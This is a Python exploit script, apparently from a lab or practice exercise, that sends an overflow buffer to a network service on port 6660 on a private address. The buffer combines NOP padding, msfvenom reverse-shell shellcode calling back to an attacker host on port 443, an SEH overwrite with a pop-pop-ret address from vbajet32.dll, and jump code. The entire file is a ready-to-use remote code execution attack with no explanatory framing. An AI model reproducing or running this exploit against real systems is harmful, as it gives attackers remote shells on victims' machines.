#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=6660

buffer = "USV "
buffer+= "\x90" * 194
buffer+= "\x90" * 16 # Jump code lands here on 16 NOPS

# sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.108 lport=443 EXITFUNC=thread -b "\x00\x0a\0x0d\x20\x25" -f python
# 348 bytes
buffer+= b""
buffer+= b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buffer+= b"\x76\x0e\x91\xd0\x0e\x94\x83\xee\xfc\xe2\xf4\x6d\x38"
buffer+= b"\x8c\x94\x91\xd0\x6e\x1d\x74\xe1\xce\xf0\x1a\x80\x3e"
buffer+= b"\x1f\xc3\xdc\x85\xc6\x85\x5b\x7c\xbc\x9e\x67\x44\xb2"
buffer+= b"\xa0\x2f\xa2\xa8\xf0\xac\x0c\xb8\xb1\x11\xc1\x99\x90"
buffer+= b"\x17\xec\x66\xc3\x87\x85\xc6\x81\x5b\x44\xa8\x1a\x9c"
buffer+= b"\x1f\xec\x72\x98\x0f\x45\xc0\x5b\x57\xb4\x90\x03\x85"
buffer+= b"\xdd\x89\x33\x34\xdd\x1a\xe4\x85\x95\x47\xe1\xf1\x38"
buffer+= b"\x50\x1f\x03\x95\x56\xe8\xee\xe1\x67\xd3\x73\x6c\xaa"
buffer+= b"\xad\x2a\xe1\x75\x88\x85\xcc\xb5\xd1\xdd\xf2\x1a\xdc"
buffer+= b"\x45\x1f\xc9\xcc\x0f\x47\x1a\xd4\x85\x95\x41\x59\x4a"
buffer+= b"\xb0\xb5\x8b\x55\xf5\xc8\x8a\x5f\x6b\x71\x8f\x51\xce"
buffer+= b"\x1a\xc2\xe5\x19\xcc\xb8\x3d\xa6\x91\xd0\x66\xe3\xe2"
buffer+= b"\xe2\x51\xc0\xf9\x9c\x79\xb2\x96\x2f\xdb\x2c\x01\xd1"
buffer+= b"\x0e\x94\xb8\x14\x5a\xc4\xf9\xf9\x8e\xff\x91\x2f\xdb"
buffer+= b"\xc4\xc1\x80\x5e\xd4\xc1\x90\x5e\xfc\x7b\xdf\xd1\x74"
buffer+= b"\x6e\x05\x99\xfe\x94\xb8\xce\x3c\xf5\xbc\x66\x96\x91"
buffer+= b"\xd1\xb5\x1d\x77\xba\x1e\xc2\xc6\xb8\x97\x31\xe5\xb1"
buffer+= b"\xf1\x41\x14\x10\x7a\x98\x6e\x9e\x06\xe1\x7d\xb8\xfe"
buffer+= b"\x21\x33\x86\xf1\x41\xf9\xb3\x63\xf0\x91\x59\xed\xc3"
buffer+= b"\xc6\x87\x3f\x62\xfb\xc2\x57\xc2\x73\x2d\x68\x53\xd5"
buffer+= b"\xf4\x32\x95\x90\x5d\x4a\xb0\x81\x16\x0e\xd0\xc5\x80"
buffer+= b"\x58\xc2\xc7\x96\x58\xda\xc7\x86\x5d\xc2\xf9\xa9\xc2"
buffer+= b"\xab\x17\x2f\xdb\x1d\x71\x9e\x58\xd2\x6e\xe0\x66\x9c"
buffer+= b"\x16\xcd\x6e\x6b\x44\x6b\xee\x89\xbb\xda\x66\x32\x04"

buffer+= "\x90" * (966 - len(buffer)) # 962 + 4 to account for "USV " is offset
buffer+= "\xeb\x06\x90\x90" # JMP SHORT 6, NOP Padding
buffer+= "\x9f\xa1\x11\x1b" # SEH Overwrite - pop-pop-ret from vbajet32.dll 0x1b11a19f
buffer+= "\x59\x59\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1" # 11 bytes, pop ecx * 3, dec ch (take 256 from ecx) * 3, jmp ecx
buffer+= "\x90" * (2504 - len(buffer))
buffer+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
